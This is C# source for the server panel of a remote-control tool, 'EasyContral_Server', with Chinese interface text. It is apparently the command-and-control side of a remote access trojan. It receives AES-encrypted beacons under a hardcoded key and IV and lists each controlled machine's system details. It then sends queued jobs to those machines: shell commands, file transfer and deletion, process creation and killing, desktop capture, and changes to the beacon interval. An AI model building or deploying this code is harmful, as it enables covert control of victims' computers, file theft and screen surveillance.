using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Newtonsoft.Json;
using static System.Windows.Forms.AxHost;

namespace EasyContral_Server
{
    public partial class Form1 : Form
    {
        static string Key = "jV5lO66M/CmXk3OP067sLbgfYTAanFcAT8oOhSzUYtw=";
        static string IV = "rNQez1Kfq8OqujG5EuyrVA==";

        HttpListener listener = new HttpListener();
        static Dictionary<string, Dictionary<string, string>> responseDic = new Dictionary<string, Dictionary<string, string>>();
        List<string> ClientList = new List<string>();
        public static string Open_ClientID = "";
        public static Queue<Dictionary<string,string>> Jobes= new Queue<Dictionary<string, string>>();
        Shell shell = new Shell();
        FileContral filecontral = new FileContral();
        ProcessContral processcontral = new ProcessContral();
        DesktopContral desktopcontral = new DesktopContral();
        public Form1()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            listener.Prefixes.Add("http://+:4400/");
            listener.Start();
            ThreadPool.QueueUserWorkItem(work => 
            {
                while (true)
                {
                    HttpListenerContext context = listener.GetContext();
                    ThreadPool.QueueUserWorkItem(o => HandleRequest(context));
                }
            });
        }
        void HandleRequest(HttpListenerContext context)
        {
            try
            {
                responseDic.Clear();
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;
                Dictionary<string, Dictionary<string, string>> DicRequestMessage = new Dictionary<string, Dictionary<string, string>>();
                string ClientIp = request.RemoteEndPoint.Address.ToString();
                using (StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding))
                {
                    string json = reader.ReadToEnd();
                    json = AESDecrypt(json, Key, IV);
                    DicRequestMessage = JsonToDic(json);
                }
                string ClientID = DicRequestMessage["State"]["ClientID"];
                if (!ClientList.Contains(ClientID))
                {
                    string HostName = DicRequestMessage["Data"]["HostName"];
                    string CPUInfo = DicRequestMessage["Data"]["CPUInfo"];
                    string MemoryInfo = DicRequestMessage["Data"]["MemoryInfo"];
                    string OSInfo = DicRequestMessage["Data"]["OSInfo"];
                    ClientList.Add(ClientID);
                    string Message = "[消息]：" + "新机器上线 " + ClientIp;
                    richTextBox1.AppendText(Message);
                    ListViewItem li = new ListViewItem();
                    li.SubItems.Add(ClientIp);
                    li.SubItems.Add(HostName);
                    li.SubItems.Add(CPUInfo);
                    li.SubItems.Add(MemoryInfo);
                    li.SubItems.Add(OSInfo);
                    li.SubItems.Add("0");
                    li.SubItems.Add(ClientID);
                    listView1.Items.Add(li);
                    ThreadPool.QueueUserWorkItem(SleepTime =>
                    {
                        while (true)
                        {
                            ListViewItem foundItem = listView1.FindItemWithText(ClientID);
                            int num = int.Parse(listView1.Items[foundItem.Index].SubItems[6].Text);
                            listView1.Items[foundItem.Index].SubItems[6].Text = (num + 1).ToString();
                            Thread.Sleep(1000);
                        }
                    });
                }
                else
                {
                    if (DicRequestMessage["State"]["Type"] != "Connecting")
                    {
                        string Type = DicRequestMessage["State"]["Type"];
                        string output = DicRequestMessage["Data"]["Result"];
                        switch (Type)
                        {
                            case "CMDResult":
                                shell.UpdateRichTextBox(output);
                                break;
                            case "DirResult":
                                filecontral.UpdateTreeView(output);
                                break;
                            case "FilesResult":
                                Dictionary<string, Dictionary<string, string>> files = JsonToDic(output);
                                filecontral.UpdateListView(files);
                                break;
                            case "File_UploadResult":
                                MessageBox.Show("上传成功");
                                break;
                            case "File_DownloadResult":
                                string path = Environment.CurrentDirectory + @"\Download";
                                if (!Directory.Exists(path))
                                {
                                    Directory.CreateDirectory(path); ;
                                }
                                string[] file = output.Split('?');
                                using (StreamWriter writer = new StreamWriter(path + @"\" + file[0]))
                                {
                                    writer.WriteLine(file[1]);
                                }
                                if (File.Exists(path + @"\" + file[0]))
                                {
                                    MessageBox.Show("下载成功");
                                }
                                else { MessageBox.Show("下载失败"); }
                                break;
                            case "File_ReNameResult":
                                MessageBox.Show("重命名成功");
                                break;
                            case "File_DeleteResult":
                                MessageBox.Show("删除成功");
                                break;
                            case "KillProcessResult":
                                MessageBox.Show("结束进程成功");
                                break;
                            case "CreateProcessResult":
                                MessageBox.Show("创建成功");
                                break;
                            case "GetDesktopResult":
                                byte[] imageBytes = Convert.FromBase64String(output);
                                desktopcontral.UpdateView(imageBytes);
                                break;
                            case "GetProcessResult":
                                Dictionary<string, Dictionary<string, string>> DicProcess = JsonConvert.DeserializeObject<Dictionary<string, Dictionary<string, string>>>(output);
                                processcontral.UpdateListView(DicProcess);
                                break;
                            default:
                                MessageBox.Show("错误");
                                break;
                        }
                    }
                    ListViewItem foundItem = listView1.FindItemWithText(ClientID);
                    listView1.Items[foundItem.Index].SubItems[6].Text = "0";
                }
                if (Jobes.Any())
                {
                    Dictionary<string, string> Jobe = Jobes.Dequeue();
                    string Type = Jobe["Type"];
                    Dictionary<string, string> State = new Dictionary<string, string>();
                    Dictionary<string, string> Data = new Dictionary<string, string>();
                    switch (Type)
                    {
                        case "File_Upload":
                            State.Clear();
                            Data.Clear();
                            State.Add("Type", Type);
                            Data.Add("ServerMessage", Jobe["Path"]);
                            Data.Add("FileData", Jobe["Data"]);
                            responseDic.Add("State", State);
                            responseDic.Add("Data", Data);
                            break;
                        default:
                            SendToMessage(State, Data, Jobe, Type);
                            break;
                    }
                }
                else
                {
                    Dictionary<string, string> State = new Dictionary<string, string>();
                    Dictionary<string, string> Data = new Dictionary<string, string>();
                    State.Add("Type", "Connecting");
                    Data.Add("ServerMessage", ClientID);
                    responseDic.Add("State", State);
                    responseDic.Add("Data", Data);
                }

                byte[] buffer = Encoding.UTF8.GetBytes(AESEncrypt(DicToJson(responseDic), Key, IV));
                response.ContentLength64 = buffer.Length;
                response.OutputStream.Write(buffer, 0, buffer.Length);
                response.OutputStream.Close();
            }
            catch (Exception ex)
            {
                responseDic.Clear();
                return;
            }
        }
        private void SendToMessage(Dictionary<string, string> State, Dictionary<string, string> Data, Dictionary<string, string> Jobe, string Type)
        {
            State.Clear();
            Data.Clear();
            State.Add("Type", Type);
            Data.Add("ServerMessage", Jobe["Data"]);
            responseDic.Add("State", State);
            responseDic.Add("Data", Data);
        }
        private void listView1_MouseClick(object sender, MouseEventArgs e)
        {
            ListView listView = (ListView)sender;
            ListViewItem item = listView.GetItemAt(e.X, e.Y);
            if (item != null && e.Button == MouseButtons.Right)
            {
                this.contextMenuStrip1.Show(listView, e.X, e.Y);
            }
        }

        private void GetShell_Click(object sender, EventArgs e)
        {
            ListView.SelectedIndexCollection indexes = this.listView1.SelectedIndices;
            if (indexes.Count > 0)
            {
                int index = indexes[0];
                Open_ClientID = listView1.Items[index].SubItems[7].Text;
                shell.ShowDialog();
            }
        }        
        public string DicToJson(Dictionary<string, Dictionary<string, string>> DicMessage)
        {
            string Json = JsonConvert.SerializeObject(DicMessage, Formatting.Indented);
            return Json;
        }
        public Dictionary<string, Dictionary<string, string>> JsonToDic(string Json)
        {
            Dictionary<string, Dictionary<string, string>> Dic = JsonConvert.DeserializeObject<Dictionary<string, Dictionary<string, string>>>(Json);
            return Dic;
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            richTextBox1.SelectionStart = richTextBox1.Text.Length;
            richTextBox1.ScrollToCaret();
        }

        private void Remove_Click(object sender, EventArgs e)
        {
            ListView.SelectedIndexCollection indexes = this.listView1.SelectedIndices;
            if (indexes.Count > 0)
            {
                int index = indexes[0];
                listView1.Items[index].Remove();
            }
        }

        private void FileContral_Click(object sender, EventArgs e)
        {
            filecontral.ShowDialog();
        }

        private void Edit_Click(object sender, EventArgs e)
        {
            string time = Interaction.InputBox("重新设置响应时间，响应时间是被控端延迟多久重新获取服务器信息的时间（单位：秒）", "响应时间");
            try
            {
                if (int.Parse(time) < 0)
                {
                    MessageBox.Show("输入无效"); return;
                }
            }
            catch { MessageBox.Show("输入无效"); return; }
            Dictionary<string, string> Jobe = new Dictionary<string, string>();
            Jobe.Add("Type", "SetSleepTime");
            Jobe.Add("Data", time);
            Form1.Jobes.Enqueue(Jobe);
        }

        private void ProcessContral_Click(object sender, EventArgs e)
        {
            processcontral.ShowDialog();
        }

        private void DesktopContral_Click(object sender, EventArgs e)
        {
            desktopcontral.ShowDialog();
        }
        public static string AESEncrypt(string plainText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        return Convert.ToBase64String(msEncrypt.ToArray());
                    }
                }
            }
        }
        public static string AESDecrypt(string cipherText, string key_, string iv_)
        {
            using (Aes aesAlg = Aes.Create())
            {
                byte[] key = Convert.FromBase64String(key_);
                byte[] iv = Convert.FromBase64String(iv_);
                aesAlg.Key = key;
                aesAlg.IV = iv;
                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            return srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}
